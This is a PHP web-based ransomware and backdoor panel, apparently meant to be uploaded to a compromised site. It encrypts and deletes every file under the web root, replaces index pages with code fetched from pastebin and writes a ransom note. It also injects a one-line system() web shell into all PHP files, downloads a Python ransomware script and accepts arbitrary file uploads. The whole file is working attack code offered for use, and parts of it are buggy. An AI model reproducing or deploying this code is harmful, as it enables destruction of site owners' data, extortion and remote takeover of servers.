<?php
ini_set('display_errors','On');
error_reporting( E_ERROR );

echo "<h2><center><font color='black'>Ransomware</font></center><br/></h2>";

function encrypt_decrypt($action, $string, $secret_key, $encrypt_method, $iv) {
    $key = hash('sha256', $secret_key);
    if( $action == 'encrypt' ) {
        return base64_encode(openssl_encrypt($string, $encrypt_method, $key, 0, $iv));
    }
    else if( $action == 'decrypt' ){
        return openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }
}

function encfile($file){
  if (strpos($file, '.htaccess') != false) return;
  if (strpos($file, '.FS') != false) return;
  if (strpos($file, 'Readme.html') != false) return;
  if (strpos($file, 'rans') != false) return;
  $code = file_get_contents('http://pastebin.com/raw/P5MskjcX');
  if (strpos($file, 'index') != false) { file_put_contents($file, $code); return;}
  file_put_contents($file.'.FS', encrypt_decrypt($_POST['encdec'], file_get_contents($file), $_POST['key'], $_POST['mthd'], $_POST['iv']));
  unlink($file);
}

function z($file){
  if (strpos($file, '.htaccess') != false) return;
  if (strpos($file, 'Readme.html') != false) return;
  if (strpos($file, 'rans') != false) return;
  $code = file_get_contents('http://pastebin.com/raw/P5MskjcX');
  if (strpos($file, 'index') != false) { file_put_contents($file, $code); return;}
  $dec = encrypt_decrypt('decrypt', file_get_contents($file), $_POST['key'], $_POST['mthd'], $_POST['iv']);
  $file = substr($file, 0, -3);
  file_put_contents($file, $dec);
  unlink($file.'.FS');
}

function encdir($dir, $func){
  $j = 0;
  $files = array_diff(scandir($dir), array('.', '..'));
  foreach ($files as $filecip){
    if(is_dir($dir.'\\'.$filecip)){
      encdir($dir.'\\'.$filecip, $func);
    }else{
      $j++;
      echo "Encrypted in the directory ".$j.' ';
      $findme    = 'z';
        $findme1   = 'Y';
      $pos1 = stripos($func, $findme);
      $pos2 = stripos($func, $findme1);
      if ($pos1 !== false){
              echo "file: ".$dir."\\".$filecip." <font color='white'>Decrypt!!!</font><br>";
      }else{
        echo "file: ".$dir."\\".$filecip." <font color='#800000'>Encrypt!!!</font><br>"; 
      }
      $func($dir.'/'.$filecip);
    }
  }
}


function shell($dir, $code) {
  $files = array_diff(scandir($dir), array('.', '..'));
  foreach ($files as $filemine){
    if(is_dir($dir.'\\'.$filemine)){
      encdir($dir.'\\'.$filemine);
    }else{
      $a = stripos(basename($dir.'/'.$filemine), 'php');
      if ($a !== false) {
        file_put_contents($dir.'/'.$filemine, $code, FILE_APPEND);
        echo "<dir='ltr'><font face='Tahoma' size='2'><font color='#008000'><br/><br/>".$dir.'/'.$filemine.'<br/></font>';
      }
    }
  }
}

function mcrypt($file){
  if (strpos($file, '.htaccess') != false) return;
  if (strpos($file, '.FS') != false) return;
  if (strpos($file, 'Readme.html') != false) return;
  if (strpos($file, 'rans') != false) return;
  $code = file_get_contents('http://pastebin.com/raw/P5MskjcX');
  if (strpos($file, 'index') != false) { file_put_contents($file, $code); return;}

    $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
    );
    $key = $_POST['key1'];
    $encrypted = base64_encode( $iv . mcrypt_encrypt(MCRYPT_RIJNDAEL_256, hash('sha256', $key, true), file_get_contents($file), MCRYPT_MODE_CBC, $iv));
  file_put_contents($file.'.FS',  $encrypted);
  unlink($file);
}

function z1($file){
  if (strpos($file, '.htaccess') != false) return;
  if (strpos($file, 'Readme.html') != false) return;
  if (strpos($file, 'rans') != false) return;
  $code = file_get_contents('http://pastebin.com/raw/P5MskjcX');
  if (strpos($file, 'index') != false) { file_put_contents($file, $code); return;}
   $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
    );
  $key = $_POST['key1'];
  $dec = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, hash('sha256', $key, true), file_get_contents($file),  MCRYPT_MODE_CBC, $iv);
  $file = substr($file, 0, -3);
  file_put_contents($file,  $dec);
  unlink($file.'.FS');
}

function cxor($file){
  if (strpos($file, '.htaccess') != false) return;
  if (strpos($file, '.FS') != false) return;
  if (strpos($file, 'Readme.html') != false) return;
  if (strpos($file, 'rans') != false) return;
  $key = $_POST['key2'];
  $cipher = '';
  $f = file_get_contents($file);
  for($j = 0; $j < strlen($f);){
    for ($i=0; $i <strlen($key); $i++, $j++) { 
      $cipher.= $f{$j} ^ $key{$j};
    }
  }
  file_put_contents($file.'.FS', $cipher);
  unlink($file);
}

?>
<style type="text/css">
  body {
  background-image: url(https://www.walldevil.com/wallpapers/a78/hope-anonymous.jpg); background-repeat: no-repeat;
  color: #e2e2e2;
  -moz-background-size: 100%; /* Firefox 3.6+ */
  -webkit-background-size: 100%; /* Safari 3.1+ и Chrome 4.0+ */
  -o-background-size: 100%; /* Opera 9.6+ */
  background-size: 100%
  }

  .b1 {
    background: #800000;
    color: white; 
    font-size: 9pt; 
   }
</style>
<body>
    <form method="POST">
      <center>
          Dir:
            <input type="text" name="direc" value=<?php echo $_SERVER['DOCUMENT_ROOT']; ?> ><br/><br/>
            <div style="margin-left: 23px;">
            <select name="case">
                    <option value="php">Backdoor</option>
                    <option value="python">Python Ransomware</option>
                </select>
                <input type='submit' value='Upload' name='up'><br/><br/>
                </div>
              <input type="file" id="inputfile" name="inputfile">
                 <input type="submit" name="back" value="Click To Upload"><br/><br/>
        <font color='white'>OpenSSL: </font><br/><br/>
          Key:
          <input type="text" name="key" class="c1" placeholder="ENC/DEC">
          Mthd:
          <select name="mthd">
            <option value="AES-256-CBC">AES-256-CBC</option>
            <option value="AES-128-CBC">AES-128-CBC</option>
          </select>
          iv:
          <input type="text" name="iv" placeholder="iv">
          <select name="encdec">
            <option value="encrypt">Encrypt</option>
            <option value="decrypt">Decrypt</option>
          </select>
          <input type="submit" name="go" class="b1" value="Enc/Dec"><br/>
          </center>
      <center><br/>
        <font color='white'>Mcrypt: </font><br/><br/>
        Key:
        <input type="text" name="key1" placeholder="ENC/DEC">
        <select name="mcrdec">
          <option value="encrypt">Encrypt</option>
          <option value="decrypt">Decrypt</option>
        </select>
          <input type="submit" name="ok" class="b1" value="Enc/Dec">
      </center><br/>
        <center>
          <font color='white'>Xor: </font><br/><br/>
          Key:
          <input type="text" name="key2" placeholder="ENC/DEC">
          <input type="submit" name="enc" class="b1" value="Enc/Dec"><br/>
        </center>
    </form>
</body>


<br/><br/><form method='POST'>
  <center>
    Message:<br/><br/>
    <textarea name="dor" rows=12></textarea><br/><br/>
    <input type='submit' name='enter' value='Write'>
  </center>
</form>

<?php

if(isset($_POST['enter'])){
  $f = fopen("Readme.html", "w");
  fwrite($f, $_POST['dor']); 
  fclose($f);
}

if(isset($_POST['go'])){  
  echo '<center><font color="white">Website: '.$_SERVER['HTTP_HOST'].'<br/>';
    echo 'Key: '.$_POST['key'].'<br/>';
    echo 'Cipher: '.$_POST['mthd'].'<br/>';
    echo 'iv: '.$_POST['iv'].'<br/>';
    echo 'Method: OpenSSL</font></center><br/>';
    if($_POST['encdec'] == 'encrypt'){ 
      encdir($_POST['direc'] , 'encfile'); 
    }else if($_POST['encdec'] == 'decrypt'){
    encdir($_POST['direc'] , 'z'); 
  }
}

if(isset($_POST['ok'])){ 
  echo '<center><font color="white">Website: '.$_SERVER['HTTP_HOST'].'<br/>';
    echo 'Key: '.$_POST['key1'].'<br/>';
    echo 'Method: Mcrypt</font></center><br/>';
    if($_POST['mcrdec'] == 'encrypt') { 
      encdir($_POST['direc'], 'mcrypt');
    }else if($_POST['mcrdec'] == 'decrypt'){
      encdir($_POST['direc'] , 'z1');
    }
}

if(isset($_POST['enc'])){ 
  echo '<center><font color="white">Website: '.$_SERVER['HTTP_HOST'].'<br/>';
    echo 'Key: '.$_POST['key2'].'<br/>';
    echo 'Method: Xor</font></center><br/>';  
  encdir($_POST['direc']  , 'cxor');
    Nfile();
}

if(isset($_POST['up'])){
    if($_POST['case'] == 'php')  {
        $shell = '<?php system($_GET["com"]); ?>';
        shell($_POST['direc'], $shell);
    }else{
      $d = file_get_contents('http://pastebin.com/raw/UjAGa3Yp');
      $f = file_put_contents('ransomware.py', $d);
    }
}

  if(!empty($_FILES['inputfile'])){
    $path = __DIR__;
    $path = $path . basename( $_FILES['inputfile']['name']);
    if(move_uploaded_file($_FILES['inputfile']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['inputfile']['name']). 
      " has been uploaded";
      }
  }
?>
